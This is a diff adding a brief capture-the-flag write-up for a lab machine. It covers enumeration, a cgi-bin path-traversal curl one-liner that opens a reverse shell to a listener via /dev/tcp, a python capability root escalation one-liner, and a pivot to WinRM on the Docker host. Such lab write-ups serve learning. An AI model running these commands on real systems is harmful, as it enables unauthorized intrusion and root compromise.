@@ -1,0 +1,23 @@
+after basic enum, nmap nikto and gobuster, 
+
+i  had to lookup the next step which is a fun one-liner for /CGI-BIN, very often present on those type of challenges, never exploited it though 
+
+**`$curl 'http://10.10.239.45/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash' -d 'echo Content-Type: text/plain; echo; bash -i >& /dev/tcp/10.9.1.30/1337 0>&1' -H "Content-Type: text/plain"`**
+
+after setting up a listener this gets us a reverse shell 
+
+so, after getting a foothold, i decided to enumerate further and found out that python has capability set, so privesc was pretty easy:
+
+`./python -c 'import os; os.setuid(0); os.system("/bin/sh")'`
+
+after enumerating further (and looking up a writeup)
+
+it turned out that the whole system was on a docker environment 
+
+so, the machines ip was 172.17.0.2, so docker host is at 172.17.0.1, 
+
+after running nmap with `-p-` switch, it turned out that there are 4 open ports, 22, 80, 5985, 5986
+
+[https://github.com/carlospolop/hacktricks/blob/master/pentesting/5985-5986-pentesting-winrm.md](https://github.com/carlospolop/hacktricks/blob/master/pentesting/5985-5986-pentesting-winrm.md) 
+
+after googling it, this github link pops out, containg a python script that allows us to get RCE on host, which would allow  us to get a shell, but i only decided to cat out /root/root.txt
